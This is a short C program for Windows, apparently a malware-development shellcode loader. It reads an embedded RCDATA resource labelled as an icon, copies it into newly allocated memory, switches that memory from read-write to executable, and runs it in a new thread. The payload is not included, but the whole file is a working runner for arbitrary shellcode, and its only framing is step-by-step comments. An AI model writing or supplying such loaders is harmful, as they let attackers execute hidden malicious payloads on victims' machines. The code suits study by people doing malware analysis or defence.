#define UNICODE
#define _UNICODE

#include <windows.h>
#include <stdio.h>
#include <string.h>

#define SC_ICON 2583

int main(VOID) {

    // find shellcode payload (con Unicode)
    HRSRC shellcode = FindResourceW(NULL, MAKEINTRESOURCEW(SC_ICON), RT_RCDATA);

    // load shellcode payload
    HGLOBAL shellcode_handle = LoadResource(NULL, shellcode);
    
    // get pointer to shellcode payload
    LPVOID shellcode_payload = LockResource(shellcode_handle);

    // get length of shellcode payload
    DWORD shellcode_length = SizeofResource(NULL, shellcode);
        
    // allocate the memory
    LPVOID memory_address = VirtualAlloc(NULL, shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // load shellcode into memory
    RtlMoveMemory(memory_address, shellcode_payload, shellcode_length);

    DWORD old_protection = 0;
    BOOL returned_vp = VirtualProtect(memory_address, shellcode_length, PAGE_EXECUTE_READ, &old_protection);

    if (returned_vp) {
        HANDLE thread_handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) memory_address, NULL, 0, NULL);

        WaitForSingleObject(thread_handle, INFINITE);
    }

    return 0;
}
